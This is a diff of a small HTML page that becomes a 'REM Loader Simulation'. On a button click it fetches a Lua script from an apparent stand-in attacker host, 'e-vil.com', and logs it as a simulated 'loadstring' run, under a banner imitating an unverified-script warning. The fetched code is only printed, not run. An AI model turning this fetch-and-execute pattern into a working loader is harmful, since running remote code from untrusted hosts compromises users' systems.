@@ -2,45 +2,50 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Lua Key Generator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>REM Loader Simulation</title>
+<style>
+    body { font-family: Arial, sans-serif; background: #222; color: #eee; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; }
+    button { padding:10px 20px; margin-top:20px; background:#ff3c3c; color:white; border:none; border-radius:5px; cursor:pointer; }
+    button:hover { background:#ff1c1c; }
+    pre { background:#111; padding:15px; border-radius:8px; max-width:90%; overflow-x:auto; }
+</style>
 </head>
 <body>
-<h2>Lua Key Generator</h2>
-<button id="loadBtn">Get Lua Key</button>
+
+<h2>REM Loader Simulation</h2>
+<pre>
+// WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+// REM v1.2 - Build 2025-08-11
+</pre>
+<button id="loadBtn">Load Script</button>
 <p id="status"></p>
 
 <script>
-// Simulate fetching a key from a "server" without hardcoding URL
 document.getElementById('loadBtn').addEventListener('click', async () => {
     const status = document.getElementById('status');
-    status.textContent = "Fetching key...";
+    status.textContent = "Fetching remote script...";
 
     try {
-        // Simulate fetch (the URL is hidden / dynamic)
-        function getKeyFromServer() {
-            return new Promise(resolve => {
-                setTimeout(() => {
-                    const key = "idk lol"; // fetched secret, never in HTML source
-                    resolve(key);
-                }, 500);
-            });
-        }
+        // Replace with your actual URL if you have one
+        const scriptUrl = "https://e-vil.com/anbu/rem.lua";
 
-        const key = await getKeyFromServer();
+        // Fetch the remote Lua script (simulated here, will fail if blocked)
+        const response = await fetch(scriptUrl);
+        if (!response.ok) throw new Error('HTTP ' + response.status);
 
-        // Generate Lua code dynamically
-        const luaCode = `
--- Auto-generated Lua key
-local key = "${key}"
-print("key is " .. key)
-`;
+        const remoteScript = await response.text();
 
-        console.log("Generated Lua code:\n" + luaCode);
-        status.textContent = "Lua code generated! Check console.";
-    } catch(err) {
-        status.textContent = "Failed: " + err.message;
+        // Simulate "loadstring" execution
+        console.log("Simulated loadstring execution:\n", remoteScript);
+        status.textContent = "Script fetched and simulated! Check console for output.";
+    } catch (err) {
+        status.textContent = "Failed to load script: " + err.message;
+        console.warn("Failed to fetch remote script:", err);
     }
 });
 </script>
+
 </body>
 </html>
+
